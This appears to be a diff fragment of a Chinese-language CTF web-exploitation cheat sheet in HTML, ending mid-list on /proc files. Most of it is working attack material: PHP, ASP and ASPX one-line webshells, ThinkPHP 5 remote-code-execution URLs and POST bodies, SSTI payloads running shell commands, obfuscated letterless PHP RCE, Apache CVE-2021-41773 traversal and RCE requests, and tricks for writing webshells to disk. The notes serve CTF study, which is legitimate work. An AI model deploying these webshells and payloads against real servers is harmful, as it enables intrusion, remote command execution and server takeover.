+<p><code>\</code>绕过正则（其他符号试过貌似都不行） <code>&#125;</code>是结束前一个函数体  <code>\\</code>是注释后面的内容<br>总的来说利用<code>create_function</code>来执行<code>tac /flag</code></p>
+<h3 id="绝对路径拼接漏洞"><a href="#绝对路径拼接漏洞" class="headerlink" title="绝对路径拼接漏洞"></a>绝对路径拼接漏洞</h3><p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</p>
+<p>然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</p>
+<p>os.path.join 在win系统下遇到反斜杠和斜杠都在此处截断，在linux 系统下遇到斜杠会截断，反斜杠不会，在拼接路径时一定要把开头处的斜杠或者反斜杠处理掉，要不然会出现找不到路径的情况</p>
+<h3 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h3><p>在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p>
+<p><code>?url=http://127.0.0.123%00.ctfhub.com</code><br>eg:[GKCTF 2020]cve</p>
+<h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><p>常见MIME类型</p>
+<pre><code class="bash">text/plain（纯文本）
+text/html（HTML文档）
+text/javascript（js代码）
+application/xhtml+xml（XHTML文档）
+image/gif（GIF图像）
+image/jpeg（JPEG图像）
+image/png（PNG图像）
+video/mpeg（MPEG动画）
+application/octet-stream（二进制数据）
+application/pdf（PDF文档）
+</code></pre>
+<h3 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h3><ul>
+<li>php:</li>
+</ul>
+<pre><code class="php">&lt;?php eval($_POST1);?&gt; 
+&lt;?php @eval($_POST[&#39;value&#39;]);?&gt;
+&lt;?php if(isset($_POST[&#39;c&#39;]))&#123;eval($_POST[&#39;c&#39;]);&#125;?&gt; 
+&lt;?php system($_REQUEST1);?&gt; 
+&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; 
+&lt;?php eval_r($_POST1)?&gt; 
+&lt;?php @eval_r($_POST1)?&gt;//容错代码 
+&lt;?php @eval($_POST[sb])?&gt;
+&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
+&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;]);?&gt; 
+&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;],$_POST[&#39;cc&#39;])?&gt; 
+&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; 
+&lt;?php echo `$_GET[&#39;r&#39;]` ?&gt; 
+//绕过&lt;?限制的一句话 
+&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; 
+&lt;?php eval($_POST[sb])?&gt;
+&lt;?php assert($_POST[sb]);?&gt;
+&lt;?$_POST[&#39;sa&#39;]($_POST[&#39;sb&#39;]);?&gt;
+&lt;?$_POST[&#39;sa&#39;]($_POST[&#39;sb&#39;],$_POST[&#39;sc&#39;])?&gt;
+&lt;?php @preg_replace(&quot;/[emai]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;);?&gt;
+&lt;script language=&quot;php&quot;&gt;@eval($_POST[sb])&lt;/script&gt;   //绕过&lt;?
+</code></pre>
+<ul>
+<li>asp:</li>
+</ul>
+<pre><code class="php">&lt;%eval request(&quot;MH&quot;)%&gt;
+
+&lt;%execute request(&quot;MH&quot;)%&gt;
+
+&lt;%execute(request(&quot;MH&quot;))%&gt;
+
+&lt;%If Request(&quot;MH&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;MH&quot;))%&gt;
+
+&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt;
+
+&lt;SCRIPT language=VBScript runat=&quot;server&quot;&gt;execute request(&quot;MH&quot;)&lt;/SCRIPT&gt;
+
+&lt;%@ Page Language=&quot;Jscript&quot;%&gt;
+
+&lt;%eval(Request.Item[&quot;MH&quot;],&quot;unsafe&quot;);%&gt;
+</code></pre>
+<ul>
+<li>aspx:</li>
+</ul>
+<pre><code class="php">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;
+&lt;%eval(Request.Item[&quot;value&quot;])%&gt;
+</code></pre>
+<h3 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h3><p><code>curl -i -X OPTIONS &quot;http://node4.anna.nssctf.cn:28513/index.php&quot;</code></p>
+<p>OPTIONS 请求方法是用于描述目标资源所支持的通信选项。返回的响应可以列出该资源支持的方法，如 GET，POST，DELETE 等，也可以显示关于资源的其他信息。</p>
+<p>如果PUT是允许的，可以上马</p>
+<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><blockquote>
+<p>session.auto_start：如果 session.auto_start&#x3D;On ，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为 off。此时用户是可以自己定义 Session ID 的。比如，我们在 Cookie 里设置 PHPSESSID&#x3D;ph0ebus ，PHP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_ph0ebus”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。<br>session.save_path：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件<br>session.upload_progress_enabled：当这个配置为 On 时，代表 session.upload_progress 功能开始，如果这个选项关闭，则这个方法用不了<br>session.upload_progress_cleanup：这个选项默认也是 On，也就是说当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用条件竞争(Race Condition)的方式不停的发包，争取在它被删除掉之前就成功利用<br>session.upload_progress_name：当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控<br>session.upload_progress_prefix：它＋session.upload_progress_name 将表示为 session 中的键名</p>
+</blockquote>
+<h3 id="换行绕过正则"><a href="#换行绕过正则" class="headerlink" title="换行绕过正则"></a>换行绕过正则</h3><p>.用于任意字符匹配并不包括换行符，而且^ $界定了必须在同一行，否则匹配不到，直接利用%0a</p>
+<h3 id="json-decode和字符串弱比较"><a href="#json-decode和字符串弱比较" class="headerlink" title="json_decode和字符串弱比较"></a>json_decode和字符串弱比较</h3><pre><code class="php">json_decode($a)函数，正常情况下这个函数能将字符串转换成数组然后返回，但是少数情况下它会放飞自我。比如传入true会返回true,传入false会返回false，传入NULL会返回NULL
+</code></pre>
+<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+<h3 id="thinkphp5之rce"><a href="#thinkphp5之rce" class="headerlink" title="thinkphp5之rce"></a>thinkphp5之rce</h3><pre><code class="php">5.1x:
+?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre>
+<pre><code class="php">5.0x:
+?s=index/think\config/get&amp;name=database.username // 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    // 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     // 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index|think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=whoami
+</code></pre>
+<pre><code class="bash">http://php.local/thinkphp5.0.5/public/index.php?s=index
+post
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
+_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami
+
+# ThinkPHP &lt;= 5.0.13
+POST /?s=index/index
+s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
+
+# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug
+POST /
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al
+
+# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha
+POST /?s=xxx HTTP/1.1
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
+</code></pre>
+<h3 id="sstitest"><a href="#sstitest" class="headerlink" title="sstitest"></a>sstitest</h3><p><img src="/../post_img/sstitest.png" alt="sstitest"></p>
+<pre><code class="bash">&#123;$smarty.version&#125;
+$&#123;smarty.template&#125;
+
+data=&#123;&#123;handler.setting&#125;&#125;
+</code></pre>
+<pre><code class="bash">(1)&#123;&#123;()['__cla''ss__'].__bases__[0]['__subcl''asses__']()&#125;&#125;
+</code></pre>
+<pre><code class="python">import json
+classes=&quot;&quot;&quot;
+[(1)]
+&quot;&quot;&quot;
+num=0
+alllist=[]
+result=&quot;&quot;
+for i in classes:
+    if i==&quot;&gt;&quot;:
+        result+=i
+        alllist.append(result)
+        result=&quot;&quot;
+    elif i==&quot;\n&quot; or i==&quot;,&quot;:
+        continue
+    else:
+        result+=i
+#寻找要找的类，并返回其索引
+for k,v in enumerate(alllist):
+    if &quot;warnings.catch_warnings&quot; in v:
+        print(str(k)+&quot;---&gt;&quot;+v)
+#117---&gt; &lt;class &#39;warnings.catch_warnings&#39;&gt;
+</code></pre>
+<p><code>&#123;&#123;()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[117].__init__.__globals__['__buil''tins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125;&#125;</code></p>
+<h3 id="PCRE回溯次数限制绕过"><a href="#PCRE回溯次数限制绕过" class="headerlink" title="PCRE回溯次数限制绕过"></a>PCRE回溯次数限制绕过</h3><p>回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万,preg_match返回的非1和0，而是false</p>
+<h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p><code>?&gt;&lt;?= ·tail /f*·?&gt;</code> 这里·指反引号 内联执行<br>这个标签可以直接输出括号中的内容</p>
+<h3 id="ban了system"><a href="#ban了system" class="headerlink" title="ban了system"></a>ban了system</h3><pre><code class="php">a=var_dump(scandir(&quot;/&quot;)); #获取/目录
+a=var_dump(file_get_contents(&quot;/ffflllaaaggg&quot;));  读取flag文件
+</code></pre>
+<h3 id="head头执行命令"><a href="#head头执行命令" class="headerlink" title="head头执行命令"></a>head头执行命令</h3><p><code>&lt;?php eval(getallheaders()[&#39;Cookie&#39;])?&gt;</code></p>
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><pre><code class="bash">cat
+tail
+tac
+head
+awk &#39;&#123;print&#125;&#39; 
+nl
+</code></pre>
+<h3 id="无字母rce之自增构造paylaod"><a href="#无字母rce之自增构造paylaod" class="headerlink" title="无字母rce之自增构造paylaod"></a>无字母rce之自增构造paylaod</h3><pre><code class="php">$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
+
+这是固定格式构造出来的 assert($_POST[_]);
+
+然后post传入 _=phpinfo();
+
+eg:*/);闭合标签/*注释*/
+user=1/*&amp;pass=aa&amp;website=&amp;punctuation=*/);$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*
+</code></pre>
+<pre><code class="bash">%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b&#39;!&#39;%3d%3d&#39;%40&#39;%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d&#39;_&#39;%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
+</code></pre>
+<p><code>_=file_put_contents(&quot;getflag.php&quot;,&quot;&lt;?php eval(\$_POST[&#39;shell&#39;]);?&gt;&quot;);</code></p>
+<h3 id="jinja脚本fenjing"><a href="#jinja脚本fenjing" class="headerlink" title="jinja脚本fenjing"></a>jinja脚本fenjing</h3><pre><code class="bash">- scan: 扫描整个网站
+- crack: 对某个特定的表单进行攻击
+ 
+Usage: python -m fenjing scan [OPTIONS]
+ 
+Options:
+  --url TEXT       需要扫描的URL
+  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
+  --help           Show this message and exit.
+ 
+Usage: python -m fenjing crack [OPTIONS]
+ 
+Options:
+  --url TEXT       form所在的URL
+  --action TEXT    form的action，默认为当前路径
+  --method TEXT    form的提交方式，默认为POST
+  --inputs TEXT    form的参数，以逗号分隔
+  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
+  --help           Show this message and exit.
+</code></pre>
+<p>eg:<code>python -m fenjing crack --url &#39;http://node2.anna.nssctf.cn:28823/get_flag&#39; --method POST --inputs name --action get_flag</code></p>
+<h3 id="日志文件包含漏洞"><a href="#日志文件包含漏洞" class="headerlink" title="日志文件包含漏洞"></a>日志文件包含漏洞</h3><p>apache服务器日志存放文件位置：<code>/var/log/apache/access.log</code><br>apache日志文件存放着我们输入的url参数<br>我们可以通过在url参数中写入一句话木马，进行执行，从而将一句话木马写入到日志文件中，我们可以通过包含写入木马的日志文件，从而进行命令执行。</p>
+<p>nginx服务器日志存放位置：<code>/var/log/nginx/access.log和/var/log/nginx/error.log</code><br>由本地日志文件可以看到nginx服务器中记录的是每次请求user-agent报文，那么我们可以通过包含nginx’服务器的日志文件，然后在user-agent服务器中写入木马语句进行注入</p>
+<h3 id="一些数学函数绕过rce"><a href="#一些数学函数绕过rce" class="headerlink" title="一些数学函数绕过rce"></a>一些数学函数绕过rce</h3><pre><code class="bash">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;
+dechex(1598506324) =&gt; &quot;5f474554&quot;
+$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串
+($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  //&#123;&#125;可以代替[]
+
+base_convert(696468,10,36) =&gt; &quot;exec&quot;
+$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;
+exec(getallheaders()&#123;1&#125;)
+//操作xx和yy，中间用逗号隔开，echo都能输出
+echo xx,yy
+
+//exec(&#39;hex2bin(dechex(109270211257898))&#39;) =&gt; exec(&#39;cat f*&#39;)
+($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
+//system(&#39;cat&#39;.dechex(16)^asinh^pi) =&gt; system(&#39;cat *&#39;)
+base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
+</code></pre>
+<h3 id="php特性之-gt"><a href="#php特性之-gt" class="headerlink" title="php特性之[-&gt;_"></a>php特性之[-&gt;_</h3><p>php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线<br>但是[ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。</p>
+<h3 id="PHP-Base64-Filter"><a href="#PHP-Base64-Filter" class="headerlink" title="PHP Base64 Filter"></a>PHP Base64 Filter</h3><p>Base64编码中只包含64个可打印字符A-Za-z0-9&#x2F;+&#x3D;，而PHP在解码base64时，遇到不在其中的字符包括不可见字符、控制字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<pre><code class="php">&lt;?php
+$url=&quot;?&lt;_&gt;\xefa \x89x;&quot;;  // 字母k经过base64编码后为ax
+var_dump(base64_decode($url));
+// string(1) &quot;k&quot;
+</code></pre>
+<p>首先我们都知道include “php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;flag.php”;这里包含的是 flag.php 的内容经过base64编码后的结果。除了这个filter，PHP Filter 当中还有一种 convert.iconv 的 Filter ，可以用来将数据从字符集 A 转换为字符集 B。可以通过命令 iconv -l 列出支持的字符编码，虽然列出的字符编码比较多，但一些实际上是其他字符集的别名</p>
+<p>convert.iconv.UTF8.CSISO2022KR 将始终在字符串前面添加\x1b$)C，\x1b是不可见字符</p>
+<p>eg:<code>&lt;?=</code>$_GET[0]<code>;;?&gt;</code><br>以上 payload 的 base64 编码为 PD89YCRfR0VUWzBdYDs7Pz4&#x3D;，然后通过各种字符编码组合 fuzz 出所有单字符的编码形式，而且并不是所有出现了合法字符的编码形式就是符合要求的，然后把符合要求的组合起来即可<br>代码在<code>/Users/dionysus/PHP/base64filter_rce.php</code></p>
+<h3 id="Apache-HTTP-Server-2-4-49-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 CVE-2021-41773"></a>Apache HTTP Server 2.4.49 CVE-2021-41773</h3><p>攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受require all denied保护，则攻击者可以访问这些文件。</p>
+<pre><code class="bash">任意文件读取POC：
+GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+Host: x.x.x.x:8080
+
+
+RCE：
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: 192.168.109.128:8080
+.....
+echo; grep -r &quot;NSS&quot; /flag_is_here
+</code></pre>
+<h3 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h3><p><code>&#39;;&#39; === preg_replace(&#39;/[^\s\(\)]+?\((?R)?\)/&#39;, &#39;&#39;, $code)</code><br>需要时查阅<a href="https://www.cnblogs.com/pursue-security/p/15406272.html#_label0">here</a></p>
+<pre><code class="php">主要
+1、getallheaders()
+2、get_defined_vars()
+3、session_id()
+
+配套
+implode() 将一维数组转化为字符串
+getchwd() 函数返回当前工作目录。
+scandir() 函数返回指定目录中的文件和目录的数组。
+dirname() 函数返回路径中的目录部分。
+chdir() 函数改变当前的目录。
+readfile() 输出一个文件。
+current() 返回数组中的当前单元, 默认取第一个值。
+pos() current() 的别名。
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+end() 将内部指针指向数组中的最后一个元素，并输出。
+array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+array_slice() 函数在数组中根据条件取出一段值，并返回。
+array_reverse() 函数返回翻转顺序的数组。
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin() — 转换十六进制字符串为二进制字符串。
+getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。
+localeconv() 函数返回一包含本地数字及货币格式信息的数组。
+</code></pre>
+<p><code>system(current(getallheaders()));</code>获取当前请求中的第一个 HTTP 头的值，然后将这个值作为命令在服务器上执行。<br><code>show_source(session_id(session_start()));</code>PHPSESSID</p>
+<p><code>?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]()));</code></p>
+<pre><code class="bash">[~%8c%86%8c%8b%9a%92]-&gt;system
+[!%FF]拼接
+(
+[~%9c%8a%8d%8d%9a%91%8b]-&gt;current
+[!%FF]拼接
+(
+[~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c]-&gt;getallheaders
+[!%FF]拼接
+()));
+</code></pre>
+<h3 id="tapcode敲击码"><a href="#tapcode敲击码" class="headerlink" title="tapcode敲击码"></a>tapcode敲击码</h3><p>我也很茫然<br><img src="/../post_img/%E6%95%B2%E5%87%BB%E7%A0%81.webp" alt="敲击码"><br>附上解密网站<br><a href="http://www.hiencode.com/tapcode.html">在线解密网站</a><br>空格影响结果哦</p>
+<h3 id="preg-replace-x2F-e"><a href="#preg-replace-x2F-e" class="headerlink" title="preg_replace &#x2F;e"></a>preg_replace &#x2F;e</h3><p> <code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code><br> <code>\S*=$&#123;phpinfo()&#125;</code><br> <a href="https://xz.aliyun.com/t/2557">不懂啊</a></p>
+<h3 id="绕过字符串长度getshell"><a href="#绕过字符串长度getshell" class="headerlink" title="绕过字符串长度getshell"></a>绕过字符串长度getshell</h3><pre><code class="php">?get=eval($_GET[&#39;A&#39;]);&amp;A=system(&#39;cat /flag&#39;);
+//下面两种我尝试了不行？，有时间试过，mark一下
+?get=`$_GET[1]`;&amp;1=bash
+?get=exec($_GET[1]);
+</code></pre>
+<p>本地文件包含的利用<br><code>?get=$_GET[a](N,a,8);&amp;a=file_put_contents</code><br>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag&#x3D;8的时候内容会追加在文件末尾，而不是覆盖。</p>
+<p>除了file_put_contents，error_log函数效果也类似。<br>每次向文件’N’中写入一个字母或数字，最后构成一个base64字符串，再包含的时候使用php:&#x2F;&#x2F;filter对base64进行解码即可.</p>
+<p>以下是未实现</p>
+<pre><code class="bash"># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw
+# 最后包含
+?get=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N
+</code></pre>
+<pre><code class="bash">POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1
+Host: localhost:8081
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+param=usort(...$_GET);
+</code></pre>
+<p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">附上链接日后钻研</a><br><a href="https://www.cnblogs.com/-chenxs/p/11981586.html">有空研究</a></p>
+<h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><ul>
+<li>cmdline<br>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令</li>
+<li>cwd<br>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录 eg:<code>proc/self/cwd/index.php</code></li>
+<li>exe<br>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</li>
+<li>environ<br>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息</li>
